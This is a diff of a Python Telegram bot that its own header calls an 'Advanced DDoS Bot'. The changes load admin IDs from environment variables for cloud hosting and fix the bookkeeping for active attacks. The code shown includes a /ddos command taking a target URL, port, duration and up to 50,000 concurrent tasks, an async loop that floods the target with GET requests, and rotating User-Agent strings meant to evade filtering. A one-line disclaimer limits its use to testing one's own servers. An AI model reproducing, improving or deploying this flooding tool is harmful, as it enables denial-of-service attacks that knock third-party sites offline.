@@ -1,5 +1,6 @@
 #!/usr/bin/env python3
 # Advanced DDoS Bot with admin management and async attack
+# Для Railway: токен и админы через переменные окружения
 # by Колин (survivor)
 
 import os
@@ -17,17 +18,22 @@ BOT_TOKEN = os.getenv('BOT_TOKEN')
 if not BOT_TOKEN:
     raise ValueError("❌ Переменная окружения BOT_TOKEN не установлена!")
 
-# Список администраторов (по умолчанию один, можно добавить через команду)
-# Важно: при перезапуске добавленные админы сбросятся (для простоты)
-ADMIN_IDS = [123456789]  # замени на свой ID
+# Читаем список администраторов из переменной ADMIN_IDS (через запятую)
+admin_ids_str = os.getenv('ADMIN_IDS', '')
+if admin_ids_str:
+    ADMIN_IDS = [int(x.strip()) for x in admin_ids_str.split(',') if x.strip()]
+    print(f"✅ Загружены администраторы: {ADMIN_IDS}")
+else:
+    # Если переменная не задана, используем пустой список (тогда никто не админ)
+    ADMIN_IDS = []
+    print("⚠️ ADMIN_IDS не задана! Никто не является администратором.")
 # ================================
 
 bot = TeleBot(BOT_TOKEN)
 
-# Хранилище активных атак (чтобы можно было остановить)
+# Словарь активных атак: chat_id -> attack_id
 active_attacks = {}
 
-# Список User-Agent для рандомизации
 USER_AGENTS = [
     "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.93 Safari/537.36",
     "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0 Safari/605.1.15",
@@ -36,7 +42,6 @@ USER_AGENTS = [
 ]
 
 def is_admin(message: Message) -> bool:
-    """Проверка, является ли пользователь администратором"""
     return message.from_user.id in ADMIN_IDS
 
 # ---------- КОМАНДА ДОБАВЛЕНИЯ АДМИНА ----------
@@ -64,6 +69,7 @@ def send_welcome(message: Message):
         "/ddos <url> <port> <duration> [tasks] — запустить атаку\n"
         "/stop — остановить текущую атаку\n"
         "/addadmin <id> — добавить нового администратора\n"
+        "/help — справка\n"
         "⚠️ Только для тестирования своих серверов!",
         parse_mode='Markdown')
 
@@ -104,6 +110,8 @@ def ddos_command(message: Message):
         if tasks > 50000:
             bot.reply_to(message, "❌ Максимальное количество задач — 50000")
             return
+
+        # Проверяем, нет ли уже активной атаки для этого чата
         if message.chat.id in active_attacks:
             bot.reply_to(message, "⚠️ Уже есть активная атака. Сначала останови её командой /stop")
             return
@@ -141,7 +149,7 @@ async def attack_worker(target, port, duration, tasks_count, chat_id, attack_id)
 
     async def requester(session):
         nonlocal total, success, errors
-        while time.time() < end_time and attack_id in active_attacks.get(chat_id, {}):
+        while time.time() < end_time and chat_id in active_attacks and active_attacks[chat_id] == attack_id:
             try:
                 headers = {'User-Agent': random.choice(USER_AGENTS)}
                 async with session.get(url, headers=headers, timeout=5) as resp:
@@ -159,7 +167,7 @@ async def attack_worker(target, port, duration, tasks_count, chat_id, attack_id)
         await asyncio.gather(*tasks, return_exceptions=True)
 
     # Если атака не была остановлена досрочно, удаляем запись
-    if attack_id in active_attacks.get(chat_id, ''):
+    if chat_id in active_attacks and active_attacks[chat_id] == attack_id:
         del active_attacks[chat_id]
 
     # Отправляем отчёт
